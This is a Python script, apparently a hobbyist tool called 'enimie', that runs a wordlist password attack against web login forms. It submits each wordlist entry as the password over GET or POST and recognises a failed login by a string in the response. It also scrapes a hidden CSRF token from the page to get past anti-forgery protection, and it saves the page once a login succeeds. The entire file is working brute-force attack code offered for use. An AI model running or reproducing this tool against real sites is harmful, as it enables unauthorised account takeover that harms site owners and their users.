import argparse

print ('''
[~] Word List Attack [~]

                 "             "
  %%%   % %%   %%%    %%%%%  %%%     %%%
 #"  #  #"  #    #    # # #    #    #"  #
 #""""  #   #    #    # # #    #    #""""
 "#%%"  #   #  %%#%%  # # #  %%#%%  "#%%"

Auther  - Kavindu Nimesh
github  - kavindunimesh
youtube - Kavindu Nimesh

''')

import requests

data = {}
headers = {}

session = requests.session()
def inputs():
	p = argparse.ArgumentParser(description="""[~] WordList Attack by Kavindu Nimesh [~]""")
	p.add_argument("-u","--url",help="attack url")
	p.add_argument("-m","--method",help="http method",default="post")
	p.add_argument("-si","--si",help="static input names and values (Ex- user=admin,token=7bjsn7bnoo7b8g)",default="None")
	p.add_argument("-ai","--ai",help="Attack input names",default="")
	p.add_argument("-c","--check",help="Add some string for check information is wrong")
	p.add_argument("-f","--file",help="wordlist file name")
	p.add_argument("-st","--token",help="session token html code before value (Ex - <input name='key' type='hidden' value=')",default="None")
	p.add_argument("-stn","--stname",help="session token input name")
	p.add_argument("-ua","--useragent",help="UserAgent",default="None")
	p.add_argument("-rf","--referer",help="Referer",default="None")
	pp = p.parse_args()
	main(pp)


def main(pp):
	if pp.useragent != "None":
		headers['User-Agent'] = pp.useragent
	if pp.referer != "None":
		headers['referer'] = pp.referer
	if pp.ai != "":
		attack = pp.ai.split(",")
		if len(attack)==1:
			if pp.token == "None":
				simple(pp)
			else:
				csrf(pp)
	else:
		print ("Details Not Set. type python enimie -h for help")
def check(pp):
	if len(headers)>0:
		session.headers = headers
	if pp.method=="post":
		source = session.post(pp.url,data=data).text
	if pp.method=="get":
		a = list(data.keys())
		b = list(data.values())
		c = []
		for i in range(len(a)):
			get = a[i]+"="+b[i]+"&"
			c.append(get)
		url = pp.url+"?"+"".join(c)[0:len("".join(c))-1]
		source = session.get(url).text
	if pp.check in source:
		success = "wrong"
		return success
	else:
		print ("sucess - "+data[pp.ai])
		print ("""
   1 Get Source Code
   2 Continue
   3 Stop""")
		success = input(">>> ")
		if success == "1":
			fl = open("output.html","w")
			fl.write(source)
			return success
		elif success == "3":
			return success
		else:
			pass
			return success

def simple(pp):
	key   = []
	value = []
	if pp.si != "None":
		static = pp.si.split(",")
		for i in range(len(static)):
			keyvalue = static[i].split('=')
			key.append(keyvalue[0])
			value.append(keyvalue[1])
		for i in range(len(key)):
			data[key[i]] = value[i]
	list = open(pp.file,"r")
	line = list.readlines()
	for i in range(len(line)):
		passwd = line[i].replace("\n","")
		data[pp.ai] = passwd
		out = check(pp)
		if out == "wrong":
			print (" Wrong- "+passwd)
		elif out == "1" or out == "3":
			break


def csrf(pp):
	comma   = "'"
	source  = session.get(pp.url).text
	codes   = source.replace(comma,'"')
	source  = codes.replace("\n","")
	token   = pp.token.replace(comma,'"')
	first   = source.split(token)[1].split(">")
	first   = first[0][0:len(first[0])-1]
	data[pp.stname] = first
	simple(pp)


